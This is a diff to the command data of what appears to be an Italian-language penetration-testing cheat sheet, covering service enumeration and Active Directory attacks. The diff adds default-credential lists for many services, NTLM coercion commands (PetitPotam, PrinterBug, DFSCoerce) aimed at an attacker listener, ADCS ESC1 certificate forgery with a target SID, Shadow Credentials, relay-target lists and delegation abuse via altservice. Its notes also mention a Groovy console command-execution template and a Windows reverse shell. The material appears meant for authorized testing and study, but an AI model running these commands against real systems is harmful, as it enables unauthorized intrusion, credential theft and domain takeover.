@@ -1779,42 +1779,14 @@ const COMMANDS = [
         "placeholder": "10.10.10.11"
       }
     ],
-    "note": "# Scaricare file dalla sessione\n- `prompt off` disattiva la conferma a ogni file, poi `mget *` scarica tutti i file della cartella corrente.\n- `binary` prima di scaricare file non testuali (zip, immagini, db).\n- Il client `ftp` non è ricorsivo: per l'intero albero usa `lftp` (`mirror`) o `wget -m`."
-  },
-  {
-    "id": "nmap-ftp",
-    "name": "nmap — FTP scripts",
-    "category": "service-enum",
-    "subcategory": "ftp",
-    "group": "Anonymous Access",
-    "description": "Script NSE FTP: accesso anonimo, bounce, banner (syst) e backdoor vsftpd.",
-    "platform": "linux",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "ftp"
-    ],
-    "tags": [
-      "nmap",
-      "ftp"
-    ],
-    "template": "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>",
-    "params": [
-      {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      }
-    ]
+    "note": "# Scaricare file dalla sessione\n- `prompt off` disattiva la conferma a ogni file, poi `mget *` scarica tutti i file della cartella corrente.\n- `binary` prima di scaricare file non testuali (zip, immagini, db).\n- Il client `ftp` non è ricorsivo: per l'intero albero usa `lftp` (`mirror`) o `wget -m`.\n# Credenziali di default\n`anonymous:anonymous` · `anonymous:` (una email qualsiasi) · `ftp:ftp` · `admin:admin`. L'accesso anonimo è la prima cosa da provare sempre."
   },
   {
     "id": "ftp-lftp-access",
-    "name": "lftp — accesso interattivo",
+    "name": "lftp — login",
     "category": "service-enum",
     "subcategory": "ftp",
-    "group": "Pillaging",
+    "group": "Anonymous Access",
     "description": "Apre una sessione lftp interattiva per sfogliare il server prima di scaricare. Dentro la shell usi `ls`, `cd`, poi `get <file>`, `mget *.conf` (glob) o `mirror <dir_remota> <dir_locale>` per il ricorsivo.\n- `-u anonymous,` = login anonimo, password vuota (occhio alla virgola)\n- `-u <user>,<pass>` = login autenticato\n- Per scaricare tutto in un colpo senza entrare nella shell usa la card **lftp — download FTP**.",
     "platform": "linux",
     "requires": [
@@ -1869,6 +1841,34 @@ const COMMANDS = [
       }
     ],
     "note": "# Scaricare file dalla sessione\nDentro la shell di lftp lancia `mirror <dir_remota> <dir_locale>` per il ricorsivo, `mget *.conf` per i glob, `get file` per uno solo."
+  },
+  {
+    "id": "nmap-ftp",
+    "name": "nmap — FTP scripts",
+    "category": "service-enum",
+    "subcategory": "ftp",
+    "group": "Anonymous Access",
+    "description": "Script NSE FTP: accesso anonimo, bounce, banner (syst) e backdoor vsftpd.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "ftp"
+    ],
+    "tags": [
+      "nmap",
+      "ftp"
+    ],
+    "template": "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ]
   },
   {
     "id": "ftp-lftp",
@@ -1952,7 +1952,7 @@ const COMMANDS = [
         "url": "https://www.kali.org/tools/lftp/"
       }
     ],
-    "note": "# Download in blocco\n- `mirror` è già non interattivo: nessun `prompt off` da dare.\n- `--include-glob` / `--exclude-glob` per filtrare, `--parallel=N` per più trasferimenti insieme.\n- Per sfogliare il server a mano prima di scaricare usa la card **lftp — accesso interattivo**."
+    "note": "# Download in blocco\n- `mirror` è già non interattivo: nessun `prompt off` da dare.\n- `--include-glob` / `--exclude-glob` per filtrare, `--parallel=N` per più trasferimenti insieme.\n- Per sfogliare il server a mano prima di scaricare usa la card **lftp — login**."
   },
   {
     "id": "ftp-wget",
@@ -1960,7 +1960,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "ftp",
     "group": "Pillaging",
-    "description": "Download ricorsivo di tutti i file via FTP anonimo (mirror). `--no-passive` forza la modalità active.",
+    "description": "Download ricorsivo di tutti i file via FTP anonimo (mirror). `--no-passive-ftp` forza la modalità active.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1973,7 +1973,7 @@ const COMMANDS = [
       "ftp",
       "download"
     ],
-    "template": "wget -m --no-passive ftp://anonymous:@<ip>",
+    "template": "wget -m --no-passive-ftp ftp://anonymous:@<ip>",
     "params": [
       {
         "key": "ip",
@@ -1990,9 +1990,10 @@ const COMMANDS = [
     "subcategory": "ssh",
     "group": "Access",
     "description": "Connessione SSH con le credenziali trovate: password o chiave privata. Se il server è datato, il client moderno può rifiutare gli algoritmi legacy e vanno riabilitati a mano.\n- `-i <key>` = login con chiave privata (prima `chmod 600`)\n- `-p <port>` = porta non standard\n- `-o StrictHostKeyChecking=no` = salta il prompt della host key",
+    "note": "# Credenziali di default\nDipendono dal device/appliance, ma vale la pena provare: `root:root` · `root:toor` · `admin:admin` · `root:calvin` (Dell iDRAC) · `pi:raspberry` (Raspberry Pi) · `user:user`. Poi cerca CVE per la versione del banner.",
     "platform": "cross-platform",
     "requires": [
-      "creds"
+      "password"
     ],
     "protocols": [
       "ssh"
@@ -2069,7 +2070,7 @@ const COMMANDS = [
     "description": "Copia file sul canale cifrato SSH. La direzione dipende da quale lato porta `<user>@<ip>:`, se la sorgente o la destinazione.\n- `-r` = ricorsivo, intere cartelle\n- `-P <port>` = porta SSH non standard, con la P maiuscola a differenza di ssh\n- `-i <key>` = usa una chiave privata",
     "platform": "cross-platform",
     "requires": [
-      "creds"
+      "password"
     ],
     "protocols": [
       "ssh"
@@ -2152,7 +2153,7 @@ const COMMANDS = [
     "description": "Trasferimento interattivo su SSH, comodo per navigare e prendere più file. Comandi dentro la shell: `ls`/`cd` (remoto), `lls`/`lcd` (locale), `get`/`put`, `mget`/`mput` per i glob, `get -r <dir>` per il ricorsivo.",
     "platform": "cross-platform",
     "requires": [
-      "creds"
+      "password"
     ],
     "protocols": [
       "ssh"
@@ -2223,7 +2224,7 @@ const COMMANDS = [
     "description": "Sincronizza cartelle su SSH: veloce, incrementale e ripristinabile, ideale per file grandi o trasferimenti interrotti.\n- `-a` = modo archivio, ricorsivo con permessi e timestamp\n- `-v` = verboso\n- `-z` = comprime in transito\n- `-e ssh` = usa SSH come trasporto",
     "platform": "linux",
     "requires": [
-      "creds"
+      "password"
     ],
     "protocols": [
       "ssh"
@@ -2377,6 +2378,7 @@ const COMMANDS = [
     "subcategory": "smb",
     "group": "Null Session",
     "description": "La null session va provata sempre per prima: share guest e anonime sono sorprendentemente comuni.",
+    "note": "# Credenziali di default\nOltre alla null session (`-u '' -p ''`): `guest:` (vuota) · `administrator:administrator` · `admin:admin` · `administrator:password`. Guest abilitato è sorprendentemente comune.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -2513,7 +2515,8 @@ const COMMANDS = [
     "description": "Elenca le share con i permessi READ/WRITE usando credenziali.",
     "platform": "linux",
     "requires": [
-      "password"
+      "password",
+      "hash"
     ],
     "protocols": [
       "smb"
@@ -3121,6 +3124,7 @@ const COMMANDS = [
     "subcategory": "snmp",
     "group": "Enumeration",
     "description": "Scarica l'intero albero MIB (`.1`) via SNMP con una community valida. Ne escono utenti, processi, software installato, interfacce di rete, route e a volte credenziali in chiaro.\n- `-c <community>` = community string, funziona come una password: `public` e `private` sono i primi valori da tentare\n- `-v2c` = versione SNMP v2c",
+    "note": "# Credenziali di default\nLa community string è la «password» SNMP: `public` (sola lettura) · `private` (lettura/scrittura) · `community` · `manager` · `cisco` · `admin`. Con la `private` si può anche riscrivere la config.",
     "platform": "linux",
     "requires": [
       "password"
@@ -3347,6 +3351,7 @@ const COMMANDS = [
     "subcategory": "ldap",
     "group": "Authenticated",
     "description": "Dump degli utenti con `description` (spesso password) e `userAccountControl`.",
+    "note": "# Credenziali di default\nPrima l'anonymous bind (`-x` senza `-D`). Sugli appliance: `cn=admin,dc=<dominio>:admin` · `admin:admin` · `cn=Directory Manager:password`.",
     "platform": "linux",
     "requires": [
       "password"
@@ -3398,6 +3403,7 @@ const COMMANDS = [
     "subcategory": "mssql",
     "group": "Connection",
     "description": "Connessione a MSSQL via TDS. Esistono due modi di login: **SQL auth**, con account interni al database come `sa`, e **Windows auth**, con account di dominio via NTLM. La variante va scelta di conseguenza.",
+    "note": "# Credenziali di default\nL'account `sa` è il bersaglio: `sa:` (vuota) · `sa:sa` · `sa:Password123` · `sa:password` · `sa:sql`. Con Windows auth prova le credenziali di dominio già in mano.",
     "platform": "linux",
     "requires": [
       "password"
@@ -3653,10 +3659,12 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "rdp",
     "group": "Connection",
-    "description": "RDP standard con risoluzione dinamica e clipboard.",
+    "description": "Apre una sessione RDP grafica con credenziali valide. Sui certificati self-signed la connessione fallisce finché non si aggiunge `/cert:ignore` (già nel template); per un account di dominio serve `/d:<dominio>`. `/dynamic-resolution` adatta la finestra e `/clipboard` condivide gli appunti, comodo per trasferire comandi e file.",
     "platform": "linux",
     "requires": [
-      "password"
+      "password",
+      "hash",
+      "ticket"
     ],
     "protocols": [
       "rdp"
@@ -3665,7 +3673,7 @@ const COMMANDS = [
       "xfreerdp",
       "rdp"
     ],
-    "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /clipboard",
+    "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /cert:ignore /dynamic-resolution /clipboard",
     "params": [
       {
         "key": "ip",
@@ -3707,7 +3715,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Password",
-        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /clipboard",
+        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /cert:ignore /dynamic-resolution /clipboard",
         "description": "Auth con password (via NLA)."
       },
       {
@@ -4237,7 +4245,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "ldap",
     "group": "Authenticated",
-    "description": "Enumerazione AD via LDAP.\n- `-U` = utenti\n- `-G` = gruppi\n- `-C` = computer\n- `-m` = membri dei gruppi\n- `--da` = elenca i Domain Admins",
+    "description": "Enumerazione AD via LDAP.\n- `-U` = utenti\n- `-G` = gruppi\n- `-C` = computer\n- `-m <gruppo>` = membri di un gruppo (richiede il nome del gruppo)\n- `--da` = elenca i Domain Admins",
     "platform": "linux",
     "requires": [
       "password"
@@ -4250,7 +4258,7 @@ const COMMANDS = [
       "ldap",
       "ad"
     ],
-    "template": "windapsearch -d <domain> -u <user>@<domain> -p <password> --dc-ip <ip> -U -G -C -m",
+    "template": "windapsearch -d <domain> -u <user>@<domain> -p <password> --dc-ip <ip> -U -G -C",
     "params": [
       {
         "key": "domain",
@@ -4567,6 +4575,7 @@ const COMMANDS = [
     "subcategory": "mysql",
     "group": "Connection",
     "description": "Connessione al database MySQL. I primi tentativi sensati sono `root` con password vuota e le credenziali deboli o di default, perché su installazioni non irrobustite compaiono di frequente. La sessione ottenuta è il punto di partenza per la verifica dei prerequisiti RCE.",
+    "note": "# Credenziali di default\n`root:` (vuota) · `root:root` · `root:password` · `root:toor` · `root:mysql` · `admin:admin`. Una root con password vuota è ancora comune in lab.",
     "platform": "linux",
     "requires": [
       "password"
@@ -5025,7 +5034,7 @@ const COMMANDS = [
         "description": "Verifica se il VNC accetta connessioni senza password."
       }
     ],
-    "note": "# Porta 5800 (vnc-http)\nÈ il viewer VNC servito come applet Java via HTTP: apri `http://<ip>:5800` nel browser. Indica un VNC in ascolto sulla 5900.\n# Password VNC salvata\nUna password VNC memorizzata (config o registro) è cifrata in DES con una chiave fissa nota: decifrala con `vncpwd <file>`.",
+    "note": "# Porta 5800 (vnc-http)\nÈ il viewer VNC servito come applet Java via HTTP: apri `http://<ip>:5800` nel browser. Indica un VNC in ascolto sulla 5900.\n# Password VNC salvata\nUna password VNC memorizzata (config o registro) è cifrata in DES con una chiave fissa nota: decifrala con `vncpwd <file>`.\n# Credenziali di default\nVNC non usa username, solo una password. Molto spesso non c'è alcuna autenticazione (telecamere/IoT). Password deboli comuni: `password` · `admin` · `1234` · `vnc` · (vuota).",
     "refs": [
       {
         "label": "HackTricks — Pentesting VNC",
@@ -5253,6 +5262,7 @@ const COMMANDS = [
     "subcategory": "web-apps",
     "group": "CMS",
     "description": "Scanner WordPress: enumera plugin, temi e utenti e, con `--api-token`, mostra i CVE noti. In modalità brute force `-U` e `-P` agiscono contro `wp-login`.",
+    "note": "# Credenziali di default\nWordPress non ha un default fisso, ma dopo aver enumerato gli utenti prova `admin:admin` · `admin:password` · utente uguale alla password. Poi brute mirato con `--usernames`/`--passwords`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -5351,6 +5361,7 @@ const COMMANDS = [
     "subcategory": "web-apps",
     "group": "App Server",
     "description": "Bruteforce del Tomcat Manager (`/manager/html`). Credenziali deboli → deploy di un `.war` malevolo = RCE. Default comuni: `tomcat:tomcat`, `admin:admin`.",
+    "note": "# Credenziali di default\n`tomcat:tomcat` · `admin:admin` · `tomcat:s3cret` · `admin:tomcat` · `role1:role1` · `manager:manager` · `tomcat:password` · `admin:` (vuota). Provale su `/manager/html` prima del brute vero e proprio.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -5464,12 +5475,6 @@ const COMMANDS = [
     "template": "def proc = \"<command>\".execute()\nproc.waitFor()\nprintln proc.text",
     "params": [
       {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      },
-      {
         "key": "command",
         "label": "Comando",
         "placeholder": "id"
@@ -5505,7 +5510,7 @@ const COMMANDS = [
         "description": "Reverse shell su host Windows. `ProcessBuilder` avvia `cmd.exe` e ne collega input e output al socket verso l'attaccante. Su Windows Jenkins gira spesso come SYSTEM, quindi la shell arriva già privilegiata."
       }
     ],
-    "note": "# Nodi e accesso anonimo\nSu alcune configurazioni la console risponde anche da `/computer/(master)/script`. Dalla 2.x con setup wizard l'accesso anonimo è disabilitato di default, quindi conta l'esito del login prima di puntare alla console.",
+    "note": "# Nodi e accesso anonimo\nSu alcune configurazioni la console risponde anche da `/computer/(master)/script`. Dalla 2.x con setup wizard l'accesso anonimo è disabilitato di default, quindi conta l'esito del login prima di puntare alla console.\n# Credenziali di default\n`admin:admin` · `admin:password` · `jenkins:jenkins` · `admin:` (vuota). Con un login valido, `/script` dà la Groovy console e quindi RCE.",
     "refs": [
       {
         "label": "HackTricks — Jenkins",
@@ -5578,7 +5583,7 @@ const COMMANDS = [
         "description": "RCE pre-auth su Drupal < 7.58 e < 8.5.1, dovuta a sanitizzazione insufficiente in fase di registrazione utente. Nessuna credenziale richiesta: il modulo Metasploit consegna direttamente una sessione con i privilegi del web server."
       }
     ],
-    "note": "# Cleanup obbligatorio\nPHP filter e modulo backdoor modificano l'istanza del cliente: vanno concordati e poi rimossi, con modulo disabilitato e pagine o file cancellati. Le installazioni recenti bloccano `CHANGELOG.txt` e `README.txt`, quindi per la versione conviene droopescan.",
+    "note": "# Cleanup obbligatorio\nPHP filter e modulo backdoor modificano l'istanza del cliente: vanno concordati e poi rimossi, con modulo disabilitato e pagine o file cancellati. Le installazioni recenti bloccano `CHANGELOG.txt` e `README.txt`, quindi per la versione conviene droopescan.\n# Credenziali di default\n`admin:admin` · `admin:password`. Con un admin valido, il modulo PHP filter o Drupalgeddon portano a RCE (vedi varianti).",
     "refs": [
       {
         "label": "Drupal — SA-CORE-2018-002",
@@ -5593,6 +5598,7 @@ const COMMANDS = [
     "subcategory": "web-apps",
     "group": "App Server",
     "description": "L'API pubblica di GitLab elenca gli utenti senza autenticazione, il che permette di costruire una lista per il password spray. Va controllata anche la versione, per cercare CVE note.",
+    "note": "# Credenziali di default\n`root:5iveL!fe` (vecchio default pre-8.7) · `root:password` · `admin@example.com:5iveL!fe`. Dalle versioni recenti la password root va impostata al primo avvio, ma i lab restano indietro.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -8862,7 +8868,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "LDAP",
-    "description": "Enumera il dominio in un colpo: utenti, gruppi e password policy. `--asreproast`/`--kerberoasting` estraggono gli hash direttamente.",
+    "description": "Enumera il dominio in un colpo: utenti, gruppi e password policy. `--asreproast`/`--kerberoasting` estraggono gli hash direttamente. La variante `desc` pesca le password lasciate per errore nei campi description/info degli account, un classico dei lab.",
     "platform": "linux",
     "requires": [
       "password"
@@ -8915,6 +8921,87 @@ const COMMANDS = [
         "label": "Kerberoast",
         "template": "nxc ldap <ip> -u '<user>' -p '<password>' --kerberoasting kerb.txt",
         "description": "Estrae i TGS degli account con SPN."
+      },
+      {
+        "id": "desc",
+        "label": "Fishing description/info",
+        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M get-desc-users",
+        "description": "Legge il campo description di tutti gli utenti cercando password lasciate in chiaro. Alternativa con ldapsearch: `ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'DC=...' '(description=*)' sAMAccountName description info`."
+      }
+    ]
+  },
+  {
+    "id": "nxc-ad-vulncheck",
+    "name": "nxc — check vuln dominio (MAQ / pre2k / signing)",
+    "category": "active-directory",
+    "subcategory": "enumeration",
+    "group": "Vuln Checks",
+    "description": "Fase di check prima di attaccare: interroga il dominio per i prerequisiti dei vettori più comuni, così non si prova alla cieca. `maq` legge il MachineAccountQuota (se >= 1 si possono creare computer per RBCD/NoPac), `pre2k` trova computer con password uguale al nome, `signing` elenca gli host senza SMB signing (bersagli da relay), `vulns` lancia in un colpo i moduli per Zerologon, NoPac, PrintNightmare e coercion.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "ldap",
+      "smb"
+    ],
+    "tags": [
+      "nxc",
+      "netexec",
+      "maq",
+      "pre2k",
+      "zerologon"
+    ],
+    "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M maq",
+    "params": [
+      {
+        "key": "ip",
+        "label": "DC IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "range",
+        "label": "Subnet",
+        "placeholder": "10.10.10.0/24"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "MAQ (MachineAccountQuota)",
+        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M maq",
+        "description": "Mostra quanti computer account può creare un utente di dominio. Default 10: se è >= 1 diventano possibili RBCD e NoPac, che hanno bisogno di un computer controllato."
+      },
+      {
+        "id": "pre2k",
+        "label": "pre2k accounts",
+        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M pre2k",
+        "description": "Trova i computer account «pre-Windows 2000» la cui password iniziale è il nome del computer in minuscolo senza il `$`: credenziali valide gratis, spesso dimenticate."
+      },
+      {
+        "id": "signing",
+        "label": "SMB signing off (relay list)",
+        "template": "nxc smb <range> -u '<user>' -p '<password>' --gen-relay-list relay_targets.txt",
+        "description": "Genera la lista degli host con SMB signing disabilitato, cioè i bersagli validi per un relay con ntlmrelayx. Senza signing off il relay verso SMB non funziona."
+      },
+      {
+        "id": "vulns",
+        "label": "Vuln scan all-in-one",
+        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M zerologon -M nopac -M printnightmare -M coerce_plus",
+        "description": "Verifica in un solo comando Zerologon, NoPac, PrintNightmare e le coercion disponibili sul target. Non sfrutta nulla, segnala solo cosa è attaccabile."
       }
     ]
   },
@@ -9380,7 +9467,7 @@ const COMMANDS = [
       {
         "id": "shadow",
         "label": "Shadow Credentials",
-        "template": "certipy shadow auto -u '<user>@<domain>' -p '<password>' -account <target> -dc-ip <ip>",
+        "template": "certipy-ad shadow auto -u '<user>@<domain>' -p '<password>' -account <target> -dc-ip <ip>",
         "description": "`GenericWrite`: aggiunge `msDS-KeyCredentialLink` e recupera l’NT hash, senza toccare la password."
       },
       {
@@ -9629,7 +9716,7 @@ const COMMANDS = [
       "adcs",
       "esc1"
     ],
-    "template": "certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
+    "template": "certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
     "params": [
       {
         "key": "user",
@@ -9673,7 +9760,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC1",
-    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare che il richiedente sia davvero quell'utente. Il certificato risultante permette poi di autenticarsi come l'utente impersonato via PKINIT, quindi di ottenerne TGT e NT hash.",
+    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare l'identità del richiedente. Il certificato permette poi di autenticarsi come l'utente impersonato via PKINIT, ottenendone TGT e NT hash. Sui DC aggiornati (patch KB5014754 di maggio 2022) serve anche `-sid <SID_target>`, che si ricava da `certipy-ad find` o `lookupsid.py`, altrimenti `certipy-ad auth` fallisce.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9686,7 +9773,7 @@ const COMMANDS = [
       "certipy",
       "esc1"
     ],
-    "template": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
+    "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
     "params": [
       {
         "key": "user",
@@ -9726,6 +9813,25 @@ const COMMANDS = [
         "key": "upn",
         "label": "SAN UPN",
         "placeholder": "administrator@corp.local"
+      },
+      {
+        "key": "sid",
+        "label": "SID target (DC patchati)",
+        "placeholder": "S-1-5-21-...-500"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "ESC1",
+        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
+        "description": "Richiesta ESC1 classica. Va sui DC non ancora aggiornati alla patch di certificate binding di maggio 2022."
+      },
+      {
+        "id": "patched",
+        "label": "ESC1 (DC patchato)",
+        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>' -sid <sid>",
+        "description": "Aggiunge il SID del target nel certificato. Obbligatorio dai DC con StrongCertificateBindingEnforcement (patch KB5014754), altrimenti `certipy-ad auth` fallisce con mismatch di mapping."
       }
     ]
   },
@@ -9739,7 +9845,7 @@ const COMMANDS = [
     "note": "# Errore di clock skew\nPKINIT è sensibile alla differenza di orario con il domain controller. `KRB_AP_ERR_SKEW` si risolve sincronizzando l'orologio con `ntpdate <dc>` oppure `faketime`.",
     "platform": "linux",
     "requires": [
-      "no-creds"
+      "cert"
     ],
     "protocols": [
       "kerberos"
@@ -9748,7 +9854,7 @@ const COMMANDS = [
       "certipy",
       "pkinit"
     ],
-    "template": "certipy auth -pfx <pfx> -dc-ip <ip>",
+    "template": "certipy-ad auth -pfx <pfx> -dc-ip <ip>",
     "params": [
       {
         "key": "pfx",
@@ -9799,7 +9905,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Coercion",
-    "description": "Costringe un computer, tipicamente un domain controller, ad autenticarsi verso il listener dell'attaccante sfruttando funzioni RPC che richiamano un percorso UNC, come PetitPotam via MS-EFSR, il bug dello spooler MS-RPRN o DFSCoerce. L'autenticazione forzata va poi rilanciata in relay verso ADCS o LDAP, oppure catturata su una macchina con delega non vincolata.",
+    "description": "Costringe un computer, tipicamente un domain controller, ad autenticarsi verso il listener dell'attaccante sfruttando funzioni RPC che richiamano un percorso UNC: PetitPotam (MS-EFSR), il bug dello spooler PrinterBug (MS-RPRN) o DFSCoerce (MS-DFSNM). L'autenticazione forzata va poi rilanciata in relay verso ADCS o LDAP, oppure catturata su una macchina con delega non vincolata. Con la variante `scan` si vede prima quali metodi rispondono sul target, così si evita di provarli alla cieca.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9810,7 +9916,9 @@ const COMMANDS = [
     ],
     "tags": [
       "coercer",
-      "petitpotam"
+      "petitpotam",
+      "printerbug",
+      "dfscoerce"
     ],
     "template": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <ip> -l <attacker>",
     "params": [
@@ -9842,6 +9950,38 @@ const COMMANDS = [
         "key": "attacker",
         "label": "Listener",
         "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Coercer (tutti i metodi)",
+        "template": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <ip> -l <attacker>",
+        "description": "Prova in sequenza tutti i metodi di coercizione noti verso il target. È la scelta comoda quando non si sa quale funziona, ma è rumorosa."
+      },
+      {
+        "id": "scan",
+        "label": "Scan (check metodi)",
+        "template": "coercer scan -u '<user>' -p '<password>' -d '<domain>' -t <ip>",
+        "description": "Fase di check: elenca quali funzioni RPC di coercizione rispondono sul target senza sfruttarle, così si sceglie il metodo giusto prima di agire."
+      },
+      {
+        "id": "petitpotam",
+        "label": "PetitPotam (MS-EFSR)",
+        "template": "python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <attacker> <ip>",
+        "description": "Sfrutta EfsRpcOpenFileRaw di MS-EFSR. Sui DC senza patch KB5005413 funziona anche senza credenziali (`-u '' -p ''`). Il più affidabile verso i domain controller."
+      },
+      {
+        "id": "printerbug",
+        "label": "PrinterBug (MS-RPRN)",
+        "template": "python3 printerbug.py '<domain>/<user>:<password>'@<ip> <attacker>",
+        "description": "Sfrutta lo spooler di stampa (MS-RPRN), spesso attivo di default. Verifica prima che il servizio risponda con `rpcdump.py @<ip> | grep MS-RPRN`."
+      },
+      {
+        "id": "dfscoerce",
+        "label": "DFSCoerce (MS-DFSNM)",
+        "template": "python3 dfscoerce.py -u '<user>' -p '<password>' -d '<domain>' <attacker> <ip>",
+        "description": "Sfrutta MS-DFSNM (Distributed File System). Frequentemente non patchato e utile quando spooler ed EFSRPC sono chiusi. Richiede credenziali di dominio standard."
       }
     ]
   },
@@ -9973,7 +10113,7 @@ const COMMANDS = [
       "keycredentiallink",
       "acl"
     ],
-    "template": "certipy shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
+    "template": "certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
     "params": [
       {
         "key": "user",
@@ -10009,13 +10149,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "certipy (auto)",
-        "template": "certipy shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
+        "template": "certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
         "description": "Aggiunge la chiave, autentica e ritorna l'NT hash del target, poi pulisce."
       },
       {
         "id": "kerberos",
         "label": "Con Kerberos",
-        "template": "certipy shadow auto -u <user>@<domain> -k -account <target> -dc-ip <dc>",
+        "template": "certipy-ad shadow auto -u <user>@<domain> -k -account <target> -dc-ip <dc>",
         "description": "Come sopra ma via Kerberos (`-k`, usa il ccache): utile se NTLM è disabilitato."
       }
     ],
@@ -10164,7 +10304,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (Constrained)",
-    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali si forgia un ticket come Administrator tramite S4U2Self e S4U2Proxy, ottenendo accesso al servizio. L'enumerazione si fa con `Get-DomainUser -TrustedToAuth`.",
+    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali si forgia un ticket come Administrator tramite S4U2Self e S4U2Proxy, ottenendo accesso al servizio. L'enumerazione si fa con `Get-DomainUser -TrustedToAuth` (o `nxc ldap --find-delegation`).",
+    "note": "# Trucco /altservice\nDopo S4U2Self il ticket è legato allo SPN richiesto, ma il campo servizio non è firmato: con `-altservice cifs/<host>` (getST) o `/altservice:cifs,ldap,host` (Rubeus) lo si riscrive senza limiti. Così da uno SPN qualsiasi si ottiene `cifs/` per una shell o `ldap/` per il DCSync. Se l'account ha anche `TRUSTED_TO_AUTH_FOR_DELEGATION` (protocol transition) si possono impersonare pure utenti che non usano Kerberos.",
     "platform": "cross-platform",
     "requires": [
       "password",
@@ -10471,11 +10612,11 @@ const COMMANDS = [
   },
   {
     "id": "certipy-esc",
-    "name": "Certipy — ESC4 / ESC7",
+    "name": "Certipy — ESC2/3/4/6/7/9/10/13",
     "category": "active-directory",
     "subcategory": "priv-esc",
-    "group": "ADCS — ESC4/7",
-    "description": "Altri abusi ADCS oltre a `ESC1`. Con `ESC4` i diritti di scrittura sul template permettono di riscriverlo come `ESC1`, con ripristino obbligatorio a fine attività. Con `ESC7` il permesso Manage CA permette di aggiungersi come Officer e abilitare il template `SubCA`.",
+    "group": "ADCS — altri ESC",
+    "description": "Raccoglie gli abusi ADCS oltre a ESC1/ESC8, uno per variante. Ogni misconfigurazione è una scorciatoia diversa verso un certificato di Administrator: ESC2/ESC3 sfruttano EKU permissivi, ESC4 i diritti di scrittura sul template, ESC6 un flag della CA, ESC7 il ruolo Manage CA, ESC9/ESC10 la manipolazione dell'UPN della vittima, ESC13 una issuance policy legata a un gruppo. Prima individua quale con `certipy-ad find -vulnerable`, poi scegli la variante corrispondente.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10487,10 +10628,16 @@ const COMMANDS = [
     "tags": [
       "certipy",
       "adcs",
+      "esc2",
+      "esc3",
       "esc4",
-      "esc7"
+      "esc6",
+      "esc7",
